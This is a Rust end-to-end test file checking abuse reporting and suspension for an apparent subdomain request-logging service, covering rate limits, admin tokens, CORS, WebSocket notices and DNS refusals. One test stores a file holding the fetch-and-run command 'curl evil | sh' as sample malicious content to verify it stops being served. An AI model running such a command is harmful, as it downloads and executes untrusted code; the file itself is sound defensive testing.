//! End-to-end tests for abuse reporting and suspension, over a real HTTP server, its
//! WebSocket, and the DNS query handler.

#[cfg(test)]
mod tests {
    use crate::abuse::{AbuseList, Settings};
    use crate::tests::harness::{
        http, private_settings, websocket, ws_recv, ws_send, Reply, TestServer, ADMIN, JSON,
    };
    use crate::utils::config::CONFIG;
    use crate::utils::{generate_jwt, get_random_subdomain, write_basic_file};
    use serde_json::json;
    use std::sync::Arc;
    use tokio::sync::broadcast;

    const REPORTS: &str = "/api/v2/abuse/reports";

    fn report_body(subdomain: &str) -> String {
        json!({ "subdomain": subdomain }).to_string()
    }

    impl TestServer {
        async fn report(&self, subdomain: &str) -> Reply {
            self.request(
                "POST",
                &self.main_host(),
                REPORTS,
                JSON,
                &report_body(subdomain),
            )
            .await
        }

        /// A subdomain in use, as one is right after its session is created.
        async fn used(&self) -> String {
            let label = get_random_subdomain();
            write_basic_file(&label, &self.cache).await.unwrap();
            label
        }

        async fn logged(&self, subdomain: &str) -> usize {
            self.cache
                .llen(&format!("requests:{subdomain}"))
                .await
                .unwrap()
        }
    }

    async fn public() -> TestServer {
        TestServer::start(Settings::default()).await
    }

    // --- Reporting ---------------------------------------------------------

    #[tokio::test]
    async fn policy_describes_reporting_on_this_instance() {
        let server = public().await;
        let policy = server.main("GET", "/api/v2/abuse", &[]).await.json();
        assert_eq!(policy["reporting_enabled"], true);
        assert_eq!(policy["requires_admin_token"], false);
        assert_eq!(policy["rate_limit"]["reports"], 3);
    }

    #[tokio::test]
    async fn a_report_suspends_at_once_and_survives_a_restart() {
        let server = public().await;
        let label = server.used().await;
        let host = server.subdomain_host(&label);
        assert_eq!(server.request("GET", &host, "/", &[], "").await.status, 200);

        let reply = server.report(&label).await;
        assert_eq!(reply.status, 201, "{}", reply.body);
        assert_eq!(
            reply.json(),
            json!({ "subdomain": label, "suspended": true, "already_suspended": false })
        );
        assert_eq!(server.request("GET", &host, "/", &[], "").await.status, 410);

        let again = server.report(&label).await;
        assert_eq!(again.status, 200);
        assert_eq!(again.json()["already_suspended"], true);

        let reloaded = AbuseList::load(server.data_dir.path(), Settings::default())
            .await
            .unwrap();
        assert!(reloaded.is_blocked(&label));
    }

    #[tokio::test]
    async fn report_accepts_a_url_or_nested_name_and_rejects_bad_input_for_free() {
        let server = public().await;
        let label = server.used().await;
        let host = server.subdomain_host(&label);

        let reply = server.report(&format!("http://x.{host}/loader.png")).await;
        assert_eq!(reply.status, 201, "{}", reply.body);
        assert_eq!(reply.json()["subdomain"], label.as_str());

        // Each of these is refused with a JSON error, and none of them costs an attempt
        for (body, code) in [
            (json!({ "subdomain": "not-a-label" }), "invalid_subdomain"),
            (
                json!({ "subdomain": "abcdefgh.example.org" }),
                "invalid_subdomain",
            ),
            (json!({}), "invalid_body"),
            // A report is the subdomain and nothing else
            (
                json!({ "subdomain": "abcdefgh", "reason": "x" }),
                "invalid_body",
            ),
            (
                json!({ "subdomain": "abcdefgh", "category": "malware" }),
                "invalid_body",
            ),
        ] {
            let reply = server
                .request(
                    "POST",
                    &server.main_host(),
                    REPORTS,
                    JSON,
                    &body.to_string(),
                )
                .await;
            assert_eq!(reply.status, 400, "{body}: {}", reply.body);
            assert_eq!(reply.code(), code, "{body}");
        }

        // Two more reports fit in the budget of three
        for _ in 0..2 {
            assert_eq!(server.report(&server.used().await).await.status, 201);
        }

        let limited = server.report(&server.used().await).await;
        assert_eq!(limited.status, 429);
        assert_eq!(limited.code(), "rate_limited");
        let retry_after: u64 = limited.header("retry-after").unwrap().parse().unwrap();
        assert!((3595..=3600).contains(&retry_after), "{retry_after}");
        assert_eq!(server.abuse.blocked_count(), 3);
    }

    #[tokio::test]
    async fn a_subdomain_that_was_never_used_cannot_be_reported() {
        let server = public().await;
        let never_used = get_random_subdomain();

        let reply = server.report(&never_used).await;
        assert_eq!(reply.status, 404);
        assert_eq!(reply.code(), "unknown_subdomain");
        assert_eq!(server.abuse.blocked_count(), 0);

        // Traffic alone makes it reportable: a beacon that is hit is in use
        server
            .request("GET", &server.subdomain_host(&never_used), "/", &[], "")
            .await;
        assert_eq!(server.report(&never_used).await.status, 201);

        // Probing which labels exist costs attempts like any report
        let _ = server.report(&get_random_subdomain()).await;
        let limited = server.report(&get_random_subdomain()).await;
        assert_eq!(limited.status, 429, "{}", limited.body);
    }

    #[tokio::test]
    async fn report_demands_a_small_json_body() {
        let server = public().await;

        // `text/plain` is what a cross-site form could send without a CORS preflight
        let not_json = server
            .request(
                "POST",
                &server.main_host(),
                REPORTS,
                &[("Content-Type", "text/plain")],
                &report_body(&server.used().await),
            )
            .await;
        assert_eq!(not_json.status, 415);
        assert_eq!(not_json.code(), "unsupported_media_type");

        let oversized = "x".repeat(1025);
        let too_big = server
            .request("POST", &server.main_host(), REPORTS, JSON, &oversized)
            .await;
        assert_eq!(too_big.status, 413);

        assert_eq!(server.abuse.blocked_count(), 0);
    }

    #[tokio::test]
    async fn concurrent_reports_cannot_exceed_the_rate_limit() {
        let server = public().await;

        let mut tasks = Vec::new();
        for _ in 0..24 {
            let body = report_body(&server.used().await);
            let (addr, host) = (server.addr, server.main_host());
            tasks.push(tokio::spawn(async move {
                http(addr, "POST", &host, REPORTS, JSON, &body).await.status
            }));
        }
        let mut statuses = Vec::new();
        for task in tasks {
            statuses.push(task.await.unwrap());
        }

        assert_eq!(statuses.iter().filter(|status| **status == 201).count(), 3);
        assert_eq!(statuses.iter().filter(|status| **status == 429).count(), 21);
        assert_eq!(server.abuse.blocked_count(), 3);
    }

    #[tokio::test]
    async fn a_private_instance_takes_reports_only_with_its_admin_token() {
        let server = TestServer::start(private_settings()).await;
        let policy = server.main("GET", "/api/v2/abuse", &[]).await.json();
        assert_eq!(policy["requires_admin_token"], true);

        let anonymous = server.report(&server.used().await).await;
        assert_eq!(anonymous.status, 403);
        assert_eq!(anonymous.code(), "admin_required");

        let authorization = format!("Bearer {ADMIN}");
        let cookie = format!("admin_token={ADMIN}");
        let wrong = server
            .request(
                "POST",
                &server.main_host(),
                REPORTS,
                &[
                    ("Content-Type", "application/json"),
                    ("Authorization", "Bearer wrong"),
                ],
                &report_body(&server.used().await),
            )
            .await;
        assert_eq!(wrong.status, 403);

        // As a header, as the dashboard's cookie, or in the body
        for headers in [
            vec![
                ("Content-Type", "application/json"),
                ("Authorization", authorization.as_str()),
            ],
            vec![
                ("Content-Type", "application/json"),
                ("Cookie", cookie.as_str()),
            ],
        ] {
            let reply = server
                .request(
                    "POST",
                    &server.main_host(),
                    REPORTS,
                    &headers,
                    &report_body(&server.used().await),
                )
                .await;
            assert_eq!(reply.status, 201, "{}", reply.body);
        }
        let in_body = json!({ "subdomain": server.used().await, "admin_token": ADMIN });
        let reply = server
            .request(
                "POST",
                &server.main_host(),
                REPORTS,
                JSON,
                &in_body.to_string(),
            )
            .await;
        assert_eq!(reply.status, 201, "{}", reply.body);
    }

    #[tokio::test]
    async fn reporting_can_be_switched_off() {
        let server = TestServer::start(Settings {
            reporting_enabled: false,
            ..Settings::default()
        })
        .await;

        let reply = server.report(&server.used().await).await;
        assert_eq!(reply.status, 404);
        assert_eq!(reply.code(), "reporting_disabled");
    }

    #[tokio::test]
    async fn report_endpoint_answers_without_cors_headers() {
        let server = public().await;
        let reply = server.report(&server.used().await).await;

        assert_eq!(reply.status, 201);
        // Other API routes send these; the report route must not, or any site could make
        // its visitors' browsers file reports
        assert_eq!(reply.header("access-control-allow-origin"), None);
    }

    // --- What the owner and the world see ----------------------------------

    #[tokio::test]
    async fn a_suspended_subdomain_serves_nothing_and_logs_nothing() {
        let server = public().await;
        let label = server.used().await;
        let host = server.subdomain_host(&label);
        let token = generate_jwt(&label).unwrap();

        let put = server
            .api(
                &token,
                "PUT",
                "/api/v2/files/loader.sh",
                r#"{"body": "curl evil | sh"}"#,
            )
            .await;
        assert_eq!(put.status, 201, "{}", put.body);
        server.request("GET", &host, "/loader.sh", &[], "").await;
        let logged_before = server.logged(&label).await;
        server.report(&label).await;

        for (method, path, body) in [
            ("GET", "/loader.sh", ""),
            (
                "POST",
                "/beacon?host=victim-1",
                "{\"hostname\": \"victim-1\"}",
            ),
            ("GET", "/api/v2/files", ""),
        ] {
            let reply = server
                .request(
                    method,
                    &host,
                    path,
                    &[("Content-Type", "application/json")],
                    body,
                )
                .await;
            assert_eq!(reply.status, 410, "{method} {path}");
            assert!(!reply.body.contains("curl evil"), "nothing is served");
            assert_eq!(reply.header("cache-control"), Some("no-store"));
            assert!(reply.body.starts_with("410 Gone"), "plain text for clients");
        }

        // A browser gets a page saying what happened
        let browser = server
            .request(
                "GET",
                &host,
                "/",
                &[("Accept", "text/html,application/xhtml+xml,*/*;q=0.8")],
                "",
            )
            .await;
        assert_eq!(browser.status, 410);
        assert_eq!(
            browser.header("content-type"),
            Some("text/html; charset=utf-8")
        );
        assert!(browser.body.contains("This subdomain has been suspended"));

        // Path-based routing on the main domain is answered the same way
        let by_path = server
            .main("GET", &format!("/r/{label}/loader.sh"), &[])
            .await;
        assert_eq!(by_path.status, 410);

        assert_eq!(server.logged(&label).await, logged_before, "nothing logged");
    }

    #[tokio::test]
    async fn the_owner_is_refused_everywhere_with_its_own_code() {
        let server = public().await;
        let label = server.used().await;
        let other = server.used().await;
        let token = generate_jwt(&label).unwrap();

        // A shared request link made before the suspension
        server
            .cache
            .rpush(
                &format!("requests:{label}"),
                &json!({ "_id": "req-1", "type": "http", "raw": "", "uid": label }).to_string(),
            )
            .await
            .unwrap();
        // No body on purpose: this endpoint reads none, and a body arriving after the
        // server closed the connection would turn the close into a reset.
        let shared = server
            .api(&token, "POST", "/api/v2/requests/req-1/share", "")
            .await;
        assert_eq!(shared.status, 201);
        let share_target = format!(
            "/api/v2/requests/shared/{}",
            shared.json()["share_token"].as_str().unwrap()
        );
        assert_eq!(server.main("GET", &share_target, &[]).await.status, 200);

        server.report(&label).await;

        // Bodies are valid, so each request is refused by the suspension and not by a body
        // parser that runs first
        for (method, target, body) in [
            ("GET", "/api/v2/files", ""),
            ("PUT", "/api/v2/files", "{}"),
            ("PUT", "/api/v2/files/x", r#"{"body": "x"}"#),
            ("DELETE", "/api/v2/files/x", ""),
            ("GET", "/api/v2/dns", ""),
            ("PUT", "/api/v2/dns", r#"{"records":[]}"#),
            ("GET", "/api/v2/requests", ""),
            ("GET", "/api/v2/requests?wait=5", ""),
            ("DELETE", "/api/v2/requests", ""),
            ("GET", "/api/v2/requests/req-1", ""),
            ("DELETE", "/api/v2/requests/req-1", ""),
        ] {
            let reply = server.api(&token, method, target, body).await;
            assert_eq!(reply.status, 403, "{method} {target}: {}", reply.body);
            // "Suspended", deliberately not "invalid token": the dashboard drops sessions
            // whose token it considers invalid
            assert_eq!(reply.code(), "subdomain_suspended");
        }
        let link = server.main("GET", &share_target, &[]).await;
        assert_eq!(link.status, 403);
        assert_eq!(link.code(), "subdomain_suspended");

        // Others are unaffected
        let other_token = generate_jwt(&other).unwrap();
        assert_eq!(
            server
                .api(&other_token, "GET", "/api/v2/files", "")
                .await
                .status,
            200
        );
    }

    #[tokio::test]
    async fn a_long_poll_stops_when_its_session_is_suspended() {
        let server = public().await;
        let label = server.used().await;
        let token = generate_jwt(&label).unwrap();

        let poll = {
            let authorization = format!("Bearer {token}");
            let (addr, main_host) = (server.addr, server.main_host());
            tokio::spawn(async move {
                http(
                    addr,
                    "GET",
                    &main_host,
                    "/api/v2/requests?wait=20",
                    &[("Authorization", authorization.as_str())],
                    "",
                )
                .await
            })
        };
        tokio::time::sleep(std::time::Duration::from_millis(300)).await;
        server.report(&label).await;

        let reply = tokio::time::timeout(std::time::Duration::from_secs(5), poll)
            .await
            .expect("the poll did not end with the suspension")
            .unwrap();
        assert_eq!(reply.status, 403, "{}", reply.body);
        assert_eq!(reply.code(), "subdomain_suspended");
    }

    #[tokio::test]
    async fn health_reports_the_blocklist() {
        let server = public().await;
        let before = server.main("GET", "/health", &[]).await.json();
        assert_eq!(before["abuse"]["suspended"], 0);
        assert_eq!(before["abuse"]["persist_failures"], 0);

        server.report(&server.used().await).await;
        let after = server.main("GET", "/health", &[]).await.json();
        assert_eq!(after["abuse"]["suspended"], 1);
    }

    // --- WebSocket ---------------------------------------------------------

    #[tokio::test]
    async fn websocket_refuses_a_suspended_token_with_its_own_code() {
        let server = public().await;
        let label = server.used().await;
        let other = server.used().await;
        server.report(&label).await;

        let mut socket = websocket(server.addr, &server.main_host()).await;

        ws_send(
            &mut socket,
            &json!({ "cmd": "connect", "token": generate_jwt(&label).unwrap() }).to_string(),
        )
        .await;
        let refused = ws_recv(&mut socket).await;
        assert_eq!(refused["cmd"], "error");
        // Must not be `invalid_token`: the dashboard deletes sessions with an invalid token
        assert_eq!(refused["code"], "subdomain_suspended");
        assert_eq!(refused["subdomain"], label.as_str());

        ws_send(
            &mut socket,
            &json!({ "cmd": "connect", "token": generate_jwt(&other).unwrap() }).to_string(),
        )
        .await;
        assert_eq!(ws_recv(&mut socket).await["cmd"], "connected");

        ws_send(
            &mut socket,
            &json!({ "cmd": "connect", "token": "garbage" }).to_string(),
        )
        .await;
        assert_eq!(ws_recv(&mut socket).await["code"], "invalid_token");
    }

    #[tokio::test]
    async fn a_connected_dashboard_is_told_and_then_hears_nothing_more() {
        let server = public().await;
        let label = server.used().await;
        let host = server.subdomain_host(&label);

        let mut socket = websocket(server.addr, &server.main_host()).await;
        ws_send(
            &mut socket,
            &json!({ "cmd": "connect", "token": generate_jwt(&label).unwrap() }).to_string(),
        )
        .await;
        assert_eq!(ws_recv(&mut socket).await["cmd"], "connected");

        assert_eq!(server.report(&label).await.status, 201);
        let notice = ws_recv(&mut socket).await;
        assert_eq!(
            notice,
            json!({ "cmd": "suspended", "subdomain": label.as_str() })
        );

        server.request("GET", &host, "/after", &[], "").await;
        ws_send(&mut socket, r#"{"cmd": "ping"}"#).await;
        let next = ws_recv(&mut socket).await;
        assert_eq!(next["cmd"], "pong", "got {next} instead");
    }

    // --- DNS ---------------------------------------------------------------

    async fn dns_query(
        server: &TestServer,
        name: &str,
    ) -> (hickory_proto::op::ResponseCode, usize) {
        use hickory_proto::op::{Message, MessageType, OpCode, Query};
        use hickory_proto::rr::{Name, RecordType};
        use hickory_proto::serialize::binary::{BinDecodable, BinEncodable};
        use std::str::FromStr;

        let mut query = Message::new(0x1234, MessageType::Query, OpCode::Query);
        let mut question = Query::new();
        question.set_name(Name::from_str(name).unwrap());
        question.set_query_type(RecordType::A);
        query.add_query(question);

        let (tx, _) = broadcast::channel(16);
        let bytes = crate::dns::process_dns_query(
            &query.to_bytes().unwrap(),
            "127.0.0.1:5353".parse().unwrap(),
            server.cache.clone(),
            Arc::new(tx),
            server.abuse.clone(),
            false,
        )
        .await
        .unwrap();
        let response = Message::from_bytes(&bytes).unwrap();
        (response.metadata.response_code, response.answers.len())
    }

    #[tokio::test]
    async fn dns_treats_a_suspended_subdomain_as_nonexistent() {
        use hickory_proto::op::ResponseCode;

        let server = public().await;
        let label = server.used().await;
        let name = format!("{}.{}.", label, CONFIG.server_domain);
        let nested = format!("data.{}.", name.trim_end_matches('.'));

        assert_eq!(dns_query(&server, &name).await, (ResponseCode::NoError, 1));
        assert_eq!(server.logged(&label).await, 1);

        server.report(&label).await;

        for suspended in [&name, &nested] {
            let (code, answers) = dns_query(&server, suspended).await;
            assert_eq!(code, ResponseCode::NXDomain, "{suspended}");
            assert_eq!(answers, 0, "{suspended}");
        }
        assert_eq!(server.logged(&label).await, 1, "nothing more logged");

        let other = server.used().await;
        assert_eq!(
            dns_query(&server, &format!("{other}.{}.", CONFIG.server_domain)).await,
            (ResponseCode::NoError, 1)
        );
    }
}
